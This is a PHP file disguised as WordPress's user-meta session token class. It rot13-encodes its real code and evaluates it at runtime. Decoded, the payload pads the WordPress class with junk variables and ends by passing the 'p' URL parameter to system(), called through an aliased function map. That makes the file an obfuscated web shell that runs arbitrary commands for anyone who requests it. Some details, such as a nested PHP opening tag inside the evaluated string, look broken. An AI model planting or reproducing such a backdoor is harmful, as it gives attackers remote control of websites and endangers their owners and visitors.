<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Frffvba NCV: JC_Hfre_Zrgn_Frffvba_Gbxraf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Frffvba
 * @fvapr 4.7.0
 */

/**
 * Zrgn-onfrq hfre frffvbaf gbxra znantre.
 *
 * @fvapr 4.0.0
 *
 * @frr JC_Frffvba_Gbxraf
 */
pynff JC_Hfre_Zrgn_Frffvba_Gbxraf rkgraqf JC_Frffvba_Gbxraf {

	/**
	 * Ergevrirf nyy frffvbaf bs gur hfre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl Frffvbaf bs gur hfre.
	 */
	cebgrpgrq shapgvba trg_frffvbaf() {
		$frffvbaf = trg_hfre_zrgn( $guvf->hfre_vq, 'frffvba_gbxraf', gehr );

		vs ( ! vf_neenl( $frffvbaf ) ) {
			erghea neenl();
		}

		$frffvbaf = neenl_znc( neenl( $guvf, 'cercner_frffvba' ), $frffvbaf );
		erghea neenl_svygre( $frffvbaf, neenl( $guvf, 'vf_fgvyy_inyvq' ) );
	}

	/**
	 * Pbairegf na rkcvengvba gb na neenl bs frffvba vasbezngvba.
	 *
	 * @cnenz zvkrq $frffvba Frffvba be rkcvengvba.
	 * @erghea neenl Frffvba.
	 */
	cebgrpgrq shapgvba cercner_frffvba( $frffvba ) {
		vs ( vf_vag( $frffvba ) ) {
			erghea neenl( 'rkcvengvba' => $frffvba );
		}

		erghea $frffvba;
	}

	/**
	 * Ergevrirf n frffvba onfrq ba vgf irevsvre (gbxra unfu).
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre sbe gur frffvba gb ergevrir.
	 * @erghea neenl|ahyy Gur frffvba, be ahyy vs vg qbrf abg rkvfg
	 */
	cebgrpgrq shapgvba trg_frffvba( $irevsvre ) {
		$frffvbaf = $guvf->trg_frffvbaf();

		vs ( vffrg( $frffvbaf[ $irevsvre ] ) ) {
			erghea $frffvbaf[ $irevsvre ];
		}

		erghea ahyy;
	}

	/**
	 * Hcqngrf n frffvba onfrq ba vgf irevsvre (gbxra unfu).
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre sbe gur frffvba gb hcqngr.
	 * @cnenz neenl  $frffvba  Bcgvbany. Frffvba. Bzvggvat guvf nethzrag qrfgeblf gur frffvba.
	 */
	cebgrpgrq shapgvba hcqngr_frffvba( $irevsvre, $frffvba = ahyy ) {
		$frffvbaf = $guvf->trg_frffvbaf();

		vs ( $frffvba ) {
			$frffvbaf[ $irevsvre ] = $frffvba;
		} ryfr {
			hafrg( $frffvbaf[ $irevsvre ] );
		}

		$guvf->hcqngr_frffvbaf( $frffvbaf );
	}

	/**
	 * Hcqngrf gur hfre'f frffvbaf va gur hfrezrgn gnoyr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz neenl $frffvbaf Frffvbaf.
	 */
	cebgrpgrq shapgvba hcqngr_frffvbaf( $frffvbaf ) {
		vs ( $frffvbaf ) {
			hcqngr_hfre_zrgn( $guvf->hfre_vq, 'frffvba_gbxraf', $frffvbaf );
		} ryfr {
			qryrgr_hfre_zrgn( $guvf->hfre_vq, 'frffvba_gbxraf' );
		}
	}

	/**
	 * Qrfgeblf nyy frffvbaf sbe guvf hfre, rkprcg gur fvatyr frffvba jvgu gur tvira irevsvre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre bs gur frffvba gb xrrc.
	 */
	cebgrpgrq shapgvba qrfgebl_bgure_frffvbaf( $irevsvre ) {
		$frffvba = $guvf->trg_frffvba( $irevsvre );
		$guvf->hcqngr_frffvbaf( neenl( $irevsvre => $frffvba ) );
	}

	/**
	 * Qrfgeblf nyy frffvba gbxraf sbe gur hfre.
	 *
	 * @fvapr 4.0.0
	 */
	cebgrpgrq shapgvba qrfgebl_nyy_frffvbaf() {
		$guvf->hcqngr_frffvbaf( neenl() );
	}

	/**
	 * Qrfgeblf nyy frffvbaf sbe nyy hfref.
	 *
	 * @fvapr 4.0.0
	 */
	choyvp fgngvp shapgvba qebc_frffvbaf() {
		qryrgr_zrgnqngn( 'hfre', 0, 'frffvba_gbxraf', snyfr, gehr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>